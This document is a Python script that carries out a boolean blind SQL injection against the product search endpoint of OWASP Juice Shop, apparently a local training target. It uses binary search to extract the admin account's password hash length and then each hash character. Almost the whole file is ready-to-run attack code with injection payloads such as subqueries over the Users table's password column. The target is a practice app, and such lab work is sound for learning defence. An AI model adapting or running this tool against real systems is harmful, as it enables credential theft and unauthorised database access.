#!/usr/bin/env python3
"""
SQL Injection Tool for OWASP Juice Shop
This script extracts admin password hashes using blind SQL injection
through the product search functionality.
"""
import requests
import urllib.parse
import sys
import urllib3

# Disable SSL warnings (for using proxies)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target info and attack parameters
BASE_URL = "http://localhost:3000/rest/products/search?q="  # Search endpoint
TARGET_EMAIL = "admin@juice-sh.op"                          # Admin email to target
MD5_CHARSET = "0123456789abcdef"                            # Characters used in MD5 hashes

# Proxy for request inspection (e.g., Burp Suite)
PROXIES = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}

# HTTP Headers - minimal set needed for the attack
HEADERS = {
    "Host": "localhost:3000",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Accept": "application/json, text/plain, */*",
    "Referer": "http://localhost:3000/",
    "Connection": "keep-alive"
}

def check_sqli_condition(payload):
    """
    Send a SQL injection payload and check if it returns data
    
    True = condition is true (data returned)
    False = condition is false (no data returned)
    """
    full_url = BASE_URL + urllib.parse.quote(payload)
    try:
        response = requests.get(full_url, headers=HEADERS, proxies=PROXIES, timeout=5, verify=False)
        response.raise_for_status()
        response_json = response.json()
        return len(response_json.get('data', [])) > 0  # Data present = True condition
    except requests.exceptions.RequestException as e:
        print(f"Error sending request: {e}", file=sys.stderr)
        sys.exit(1)
    except ValueError:
        print(f"Error decoding JSON response for payload: {payload}", file=sys.stderr)
        sys.exit(1)

def get_password_length():
    """
    Step 1: Determine the password hash length using binary search
    
    Uses binary search to efficiently find the exact length of the admin password hash.
    Shows each step of the process for educational purposes.
    """
    print("[+] Finding password hash length...")
    low = 1
    high = 100  # MD5 = 32 chars, SHA-256 = 64 chars
    password_length = 0
    attempts = 0

    while low <= high:
        attempts += 1
        mid = (low + high) // 2
        print(f"[?] Try #{attempts}: Testing length {mid} [range: {low}-{high}]")
        
        # Check if password length > mid
        payload_gt = f"te123')) OR (SELECT LENGTH(password) FROM Users WHERE email = '{TARGET_EMAIL}') > {mid} --"
        if check_sqli_condition(payload_gt):
            print(f"[+] Password longer than {mid} chars → searching {mid+1}-{high}")
            low = mid + 1
        else:
            # If not greater, check if it equals mid exactly
            payload_eq = f"te123')) OR (SELECT LENGTH(password) FROM Users WHERE email = '{TARGET_EMAIL}') = {mid} --"
            if check_sqli_condition(payload_eq):
                password_length = mid
                print(f"[+] Found exact length: {mid} chars ✓")
                break
            else:
                print(f"[+] Password shorter than {mid} chars → searching {low}-{mid-1}")
                high = mid - 1
    
    if not password_length:
        print("\n[-] Failed to determine password length. Exiting.", file=sys.stderr)
        sys.exit(1)
            
    print(f"\n[+] Password hash length: {password_length}")
    return password_length

def get_password_hash(length):
    """
    Step 2: Extract password hash character by character
    
    Uses binary search on each character position to efficiently find the 
    exact value of each character in the hash.
    """
    print("[+] Extracting password hash character by character...")
    extracted_hash = ""

    for i in range(1, length + 1):
        low_idx = 0
        high_idx = len(MD5_CHARSET) - 1  # Last index of charset (15 for MD5)
        found_char = ''

        # Binary search to find the correct character at position i
        while low_idx <= high_idx:
            mid_idx = (low_idx + high_idx) // 2
            test_char = MD5_CHARSET[mid_idx]
            sys.stdout.write(f"\r[?] Trying character {i}/{length}: {extracted_hash}{test_char}")
            sys.stdout.flush()

            # Check if character at position i is > test_char
            payload_gt = f"te123')) OR (SELECT SUBSTR(password, {i}, 1) FROM Users WHERE email = '{TARGET_EMAIL}') > '{test_char}' --"
            if check_sqli_condition(payload_gt):
                # Character is in higher half of remaining charset
                low_idx = mid_idx + 1
            else:
                # Check if character equals test_char exactly
                payload_eq = f"te123')) OR (SELECT SUBSTR(password, {i}, 1) FROM Users WHERE email = '{TARGET_EMAIL}') = '{test_char}' --"
                if check_sqli_condition(payload_eq):
                    found_char = test_char
                    break
                else:
                    # Character is in lower half of remaining charset
                    high_idx = mid_idx - 1
        
        if not found_char:
            print(f"\n[-] Failed to find character at position {i}. Exiting.", file=sys.stderr)
            sys.exit(1)
        
        extracted_hash += found_char
        print(f"\r[+] Found char {i}/{length}: '{found_char}' → Hash: {extracted_hash}")

    return extracted_hash

if __name__ == "__main__":
    """
    Main execution flow:
    1. Find the password hash length using binary search
    2. Extract each character of the password hash using binary search
    3. Display the final extracted password hash
    """
    print("=" * 60)
    print(f"SQL Injection Attack - Hash Extractor for {TARGET_EMAIL}")
    print("=" * 60)
    
    # Step 1: Get the hash length
    password_length = get_password_length()
    
    # Step 2: Extract each character of the hash
    admin_password_hash = get_password_hash(password_length)
    
    # Final result
    print("\n" + "=" * 60)
    print(f"[+] SUCCESS! Admin password hash: {admin_password_hash}")
    print("=" * 60)